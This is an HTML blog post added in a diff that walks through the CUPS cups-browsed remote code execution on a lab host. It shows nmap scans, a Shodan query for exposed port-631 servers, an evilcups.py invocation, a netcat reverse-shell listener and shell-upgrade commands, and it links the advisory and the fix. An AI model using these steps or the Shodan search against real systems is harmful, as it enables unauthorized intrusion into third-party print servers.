@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>CUPS RCE PoC</title>
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+    </head>
+    <body>
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand" href="../index.html">FinalSanc</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="blog.html">Back to Blogs</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <!-- Page Header-->
+        <header class="masthead" style="background-image: url('assets/img/retro_grid.gif')">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>Attacking UNIX systems via CUPS</h1>
+                            <code>2024-10-01</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- Post Content-->
+        <article class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <h2 class="section-heading">Intro</h2>
+                        <p>CUPS is a modular printing system for Unix-like computer operating systems which allows a computer to act as a print server. This vulnerability was discovered by Evilsocket (Simone Margaritelli).</p>
+                        <code>https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8</code>
+                        <img class="img-fluid" src="https://i.imgur.com/xrajSlX.png" alt="..." />
+                        <h2 class="section-heading">PoC: RCE</h2>
+                        <p>Let’s assume our target host is 10.10.11.40. We can conduct enumeration using Nmap with the following command:</p>
+                        <code>Sudo nmap -sC -sV -vv -oA nmap/evilcups 10.10.11.40</code>
+                        <p>This command utilizes the default Nmap scripts for service detection and increased verbosity. The -oA nmap/evilcups option directs Nmap to save the scan results in a file named "nmap/evilcups".</p>
+                        <img class="img-fluid" src="https://i.imgur.com/QTGDF5t.png" alt="..." />
+                        <p>The scan reveals a Debian machine with port 22 open, along with the Internet Printing Protocol (IPP) listening on port 631, indicating it is running CUPS 2.4. A web server is hosted on this interface, displaying the title "Home – CUPS 2.4.2." We can access it at <code>http://10.10.11.40</code> in our browsers.</p>
+                        <img class="img-fluid" src="https://imgur.com/K3AUktX.png" alt="..." />
+                        <p>As we can see, the default CUPS management interface is exposed.</p>
+                        <p> [!] Note that it is effortless to search for instances where this interface is exposed on the open web. This can be done by heading to Shodan and searching:</p>
+                        <code>port:631 "CUPS"</code>
+                        <p>Using an IP address from the results in Shodan, such as <code>x.x.x.x:631</code>, we can successfully bring up the CUPS management interface for these targets.</p> 
+                        <p>Let's pivot back to our PoC for now. Currently, we are accessing this instance as an “anonymous user.” While we lack administrative privileges, we can still view the printers.  </p>
+                        <img class="img-fluid" src="https://i.imgur.com/I4rbLPZ.png" alt="..." />
+                        <p>Actions that we can conduct from here include viewing the jobs associated with this printer and printing a test page. Note that we cannot delete or modify printers at this time, as we are not an administrator.</p>
+                        <p>The next step is to run the command:</p>
+                        <code>sudo nmap -sU -p 631,632 10.10.11.40</code>
+                        <p>This command instructs nmap to perform a UDP scan on the target host. It is specifically checking ports 631 and 632. Here is the result:</p>
+                        <img class="img-fluid" src="https://i.imgur.com/d2eZ47T.png" alt="..." />
+                        <p>Note that Evilsocket has detailed the main CVEs associated with this vulnerability <a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">here</a>.</p>
+                        <img class="img-fluid" src="https://i.imgur.com/d0zB5zL.png" alt="..." />
+                        <p>Also, we can view the reported vulnerability <a href="https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8">on GitHub</a>.</p>
+                        <img class="img-fluid" src="https://i.imgur.com/S15l6j5.png" alt="..." />
+                        <p>Another version of this code has been made available to us by IppSec:</p>
+                        <code>https://github.com/ippsec/evil-cups</code>
+                        <p>IppSec has made a few improvements to this POC, and as such, I will be talking about this script. It can be run with:</p>
+                        <code>python evilcups.py [my host IP] [target host IP]</code>
+                        <p>Let’s dig into that script a bit:</p>
+                        <img class="img-fluid" src="https://i.imgur.com/GkJGrjl.png" alt="..." />
+                        <p>This function is responsible for sending our UDP packet to our target host. In this script we are sending up our specified attributes.</p>
+                        <p>An interesting part of this script is:</p>
+                        <img class="img-fluid" src="https://i.imgur.com/4gDZ6jW.png" alt="..." />
+                        <p>This line begins with a single quote. This results in a blank variable being inserted during our request. To get a better understanding of our packet we can visit <a href="https://opensource.apple.com/source/cups/cups-327/cups/doc/help/spec-browsing.html">Apple.com</a></p>
+                        <img class="img-fluid" src="https://i.imgur.com/MJa5Mt8.png" alt="..." />
+                        <p>After “evilcups.py” is executed, when we refresh the CUPS interface from earlier (<code>http://10.10.11.40</code>), we can see that we have added a new printer under the name we specified ("HACKED"):</p>
+                        <img class="img-fluid" src="https://i.imgur.com/SoKgP7u.png" alt="..." />
+                        <p>A reverse shell can be crafted with: <code>nc -lvnp 9001</code>. Here we use netcat to listen over port 9001. Next, click into this newly added printer and print a test page. By doing this we utilize the “FoomaticRIPCommandLine” section of IppSecs code, consequently spawning a shell.</p>
+                        <img class="img-fluid" src="https://i.imgur.com/bABLHJT.png" alt="..." />
+                        <p>Upgrading the shell is done with:</p>
+                        <code>python -c 'import pty;pty.spawn("/bin/bash")'</code>
+                        <p>Note that this command creates a bash shell session where a standard shell might not be available, e.g. a remote access session like this one. </p>
+                        <p>After that, we can execute the command:</p>
+                        <code>stty raw-echo;fg</code>
+                        <p>This command sets the terminal to 'raw' mode and brings the background job to the foreground. Subsequently, a reverse shell as the "lp" user is established at this point.</p>
+                        <br>
+                        <h2>The "Fix"</h2>
+                        <p>We can head to the cups-browsed Git repo and see the change brought in as a result of this vulnerability.</p>
+                        <code>https://github.com/OpenPrinting/cups-browsed/commit/1debe6b140c37e0aa928559add4abcc95ce54aa2</code>
+                        <img class="img-fluid" src="https://i.imgur.com/3s4hv74.png" alt="..." />
+                        <br><br>
+                        <h2>Closing</h2>
+                        <p>Something I found interesting was how turbulent the reporting process was for Evilsocket. They go into more detail about it in their block but essentially, this issue was quite difficult to report despite being so dangerous. Furthermore, he explains that his initial report if this finding was leaked!</p>
+                        <h2>Thank You</h2>
+                        <p>I want to thank you for reading this article, IppSec for the wonderful documentation, and Evilsocket (Simone Margaritelli) for sharing their findings surrounding this vulnerability!</p>
+                        <code>https://www.evilsocket.net/</code>
+                        <br>
+                        <code>https://www.linkedin.com/in/ippsec/</code>
+                    </div>
+                </div>
+            </div>
+        </article>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
